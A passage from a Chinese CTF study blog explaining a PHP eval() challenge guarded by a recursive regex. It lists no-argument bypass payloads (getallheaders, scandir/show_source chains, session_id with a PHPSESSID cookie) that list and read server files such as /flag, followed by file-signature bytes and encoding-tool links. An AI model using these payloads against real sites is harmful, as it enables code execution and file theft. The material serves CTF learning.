+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])&#123;<br> 		     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>	&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果’;’&#x3D;&#x3D;&#x3D;preg_replace(…)，那么就执行exp传递的命令<br>\ : 转义字符<br>[a-z,<em>]+ : [a-z,</em>]匹配小写字母和下划线 +表示1到多个<br>(?R)? : (?R)代表当前表达式，就是这个(&#x2F;[a-z,_]+((?R)?)&#x2F;)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）<br>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();</p>
+<h3 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h3><h4 id="1、getallheaders"><a href="#1、getallheaders" class="headerlink" title="1、getallheaders()"></a>1、getallheaders()</h4><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p>
+<p><code>implode()</code>能够直接将<code>getallheaders()</code>返回的数组转化为字符串。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405132202676.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p>
+<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405132202676.png" srcset="/img/loading.gif" lazyload></p>
+<p>payload：<code>?exp=eval(implode(getallheaders()));</code></p>
+<h4 id="2、get-defined-vars"><a href="#2、get-defined-vars" class="headerlink" title="2、get_defined_vars()"></a>2、get_defined_vars()</h4><h5 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())));</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl">当前目录倒数第一位文件：<br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>())));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">current</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">当前目录倒数第二位文件：</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"></span><br><span class="hljs-function">随机返回当前目录文件：</span><br><span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())));</span><br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>()))));</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())))))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">getcwd</span>())))))))))));</span><br><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">hebrevc</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">phpversion</span>())))))))))))))));</span><br></code></pre></td></tr></table></figure>
+
+<p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p>
+<h5 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h5><p>所获得的字符串第一位有几率是&#x2F;，需要多试几次</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">strrev</span>(<span class="hljs-title">crypt</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">array</span>())))))));</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2、session-start"><a href="#2、session-start" class="headerlink" title="2、session_start()"></a>2、session_start()</h4><p>适用于：php7以下的版本<br>● **session_start()**：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()<br>● **session_id()**：获取&#x2F;设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</p>
+<h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><p>● show_source(session_id(session_start()));<br>● var_dump(file_get_contents(session_id(session_start())))<br>● highlight_file(session_id(session_start()));<br>● readfile(session_id(session_start()));<br>抓包传入Cookie: PHPSESSID&#x3D;(想读的文件)即可</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/1.php?code=show_source(session_id(session_start()));</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=/flag<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360?time__1311=n4+xuDgD9DyiGQYDQNDsR32xfrorQDB00DiqhD&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/9360?time__1311=n4%2BxuDgD9DyiGQYDQNDsR32xfrorQDB00DiqhD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p>
+<h2 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h2><p>JPEG (jpg)，文件头：FFD8FFE1<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word&#x2F;Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864</p>
+<h2 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h2><ol>
+<li>Unicode，UTF-8，URL编码：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/urlencode.aspx">站长工具</a></li>
+<li>Base系列：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/base64.htm">千千秀字</a></li>
+<li>摩尔斯编码：<a target="_blank" rel="noopener" href="https://www.halove.net/ming/morse.php">世纪算命网</a></li>
+<li>条形码&#x2F;二维码：<a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/">online-barcode-reader</a></li>
+<li>MD5，Escape&#x2F;Unescape：<a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/escape.aspx">站长工具</a></li>
+<li>UUencode编码：<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/uu.html">在线工具</a></li>
+<li>XXencode编码：<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/xxencode.html">在线工具</a></li>
+<li>恺撒密码：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">千千秀字</a></li>
+<li>栅栏密码：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">千千秀字（包含空格）</a>，<a target="_blank" rel="noopener" href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/">Rail-fence Cipher（自动去空格）</a></li>
+<li>Brainfuck&#x2F;Ook！：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook！</a>（这好像是外网，可能会慢些）</li>
+<li>JSFuck：<a target="_blank" rel="noopener" href="http://utf-8.jp/public/jsfuck.html">JSF*ck demo</a></li>
+<li>ASCII转换：<a target="_blank" rel="noopener" href="http://www.ab126.com/goju/1711.html">ASCII在线转换器-十六进制，十进制、 二进制</a></li>
+<li>Base91：<a target="_blank" rel="noopener" href="https://www.dcode.fr/base-91-encoding">Base91 Cipher</a></li>
+<li>cyberchef: <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)">cyberchef</a></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web/" class="category-chain-item">web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9/">#常用知识点</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>常用知识点</div>
+      <div>http://example.com/2023/09/27/web学习/常用知识点/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Englobe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/07/%E6%AF%94%E8%B5%9B/0xgame-2023/" title="0xgame-2023">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">0xgame-2023</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/17/%E6%AF%94%E8%B5%9B/Moectf/" title="Moectf">
+                        <span class="hidden-mobile">Moectf</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"C0XNH4OuYG6qFSyM2x9ey0gQ-gzGzoHsz","appKey":"oebfztnfcNOaIyD7KaemaR6U","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
